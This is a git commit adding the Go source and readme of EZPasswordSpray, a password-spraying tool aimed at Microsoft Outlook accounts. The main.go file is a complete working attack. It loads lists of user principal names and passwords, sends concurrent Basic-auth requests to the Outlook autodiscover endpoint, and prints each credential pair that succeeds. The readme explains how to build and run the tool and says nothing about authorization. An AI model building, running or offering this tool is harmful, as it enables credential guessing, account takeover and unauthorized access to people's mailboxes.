9afbfdb5128c197e392d9151379cbb2507d04d32
Mike Kittelberger <65831584+Mike-Ki@users.noreply.github.com>
2021-10-07 10:11:34 +0200

    init

---
+++ main.go
@@ -0,0 +1,83 @@
+package main
+
+import (
+	"flag"
+	"fmt"
+	"github.com/schollz/progressbar"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+	"time"
+)
+
+var mutex sync.Mutex
+var result []string
+
+func spray(user string, pwd string, wg *sync.WaitGroup, progressbar *progressbar.ProgressBar) {
+	defer wg.Done()
+	defer progressbar.Add(1)
+
+	//fmt.Print("\r                                                                      ")
+	//fmt.Print("\rTrying " + user + " : " + pwd)
+	client := &http.Client{}
+	req, _ := http.NewRequest("GET", "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", nil)
+	req.SetBasicAuth(user, pwd)
+	resp, _ := client.Do(req)
+	if resp == nil || resp.Status != "200 OK" {
+		return
+	}
+	mutex.Lock()
+	result = append(result, "SUCCESS: " + user + " : " + pwd)
+	mutex.Unlock()
+}
+
+func readFile(path string)[]string{
+	content, err := ioutil.ReadFile(path)
+
+	if err != nil {
+		flag.PrintDefaults()
+		println("\nThe path \"" + path + "\" does not exist or the file format is wrong.\n")
+		os.Exit(1)
+	}
+	tmp := string(content)
+	return strings.Split(tmp, "\n")
+}
+
+func main() {
+	start := time.Now()
+	userList := flag.String("u","emails.txt","The users parameter is a path to the text file with the User Principal Names." +
+		"\nIn each line should be one User Principal Name.")
+	passwordList := flag.String("p","passwords.txt","The passwords parameter is a path to the text file with the passwords." +
+		"\nIn each line should be one password.")
+
+	flag.Parse()
+
+	users := readFile(*userList)
+	pwds := readFile(*passwordList)
+
+	fmt.Println("Starting EZPasswordSpray ( https://github.com/Mike-Ki/EZPasswordSpray ) at " + start.Format("2006-01-02 15:04"))
+	fmt.Printf("Password Spraying on %v Users, each with %v passwords. (Reqests in total %v)\n", len(users),len(pwds), (len(pwds) * len(users)))
+
+	var wg sync.WaitGroup
+	progressBar := progressbar.New(len(pwds) * len(users))
+
+	for _, user := range users{
+		for _, pwd := range pwds{
+			wg.Add(1)
+			go spray(strings.TrimSpace(user), strings.TrimSpace(pwd), &wg, progressBar)
+		}
+	}
+
+	// Wait til every go routine is finished
+	wg.Wait()
+
+	fmt.Println()
+	for _, res := range result {
+		fmt.Println(res)
+	}
+
+	// Tracks the time that passed
+	fmt.Println(fmt.Sprintf("\nFinished, elapsed time %0.2fs", time.Since(start).Seconds()))
+}
---
+++ readme.md
@@ -0,0 +1,38 @@
+[![made-with-Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg)](http://golang.org)
+
+## _EZPasswordSpray_
+
+EZPasswordSpray is a spraying tool that takes a user and a password file and checks if this are valid Outlook credentials.
+
+## Quick Start
+There are 2 ways of getting started:
+
+*Case 1 - Download the executable:*\
+Download the latest release from [Downloads](#downloads). After extracting the folder you will have the executable to start the program and you are ready to go. 
+
+*Case 2 - Download the source code and compile it:*\
+After Downloading the source code from Github you will have to build a new executable file.
+
+Depending on your target hardware and operating system you have to set the go environment variables:
+```sh
+set GOOS=your OS
+set GOARCH=your CPU architecture
+```
+
+with the following command you receive the list of possible variables:
+```sh
+go tool dist list
+```
+
+then navigate to the EZAudit folder within your terminal and type the following command to build the executable:
+```sh
+go build
+```
+
+After building, you can start the executable by double-clicking. The program needs paramters to start properly.
+
+## Parameter Description
+
+<code>-u</code> The users parameter is a path to the text file with the User Principal Names. In each line should be one User Principal Name.
+<code>-p</code> The passwords parameter is a path to the text file with the passwords. In each line should be one password.
+
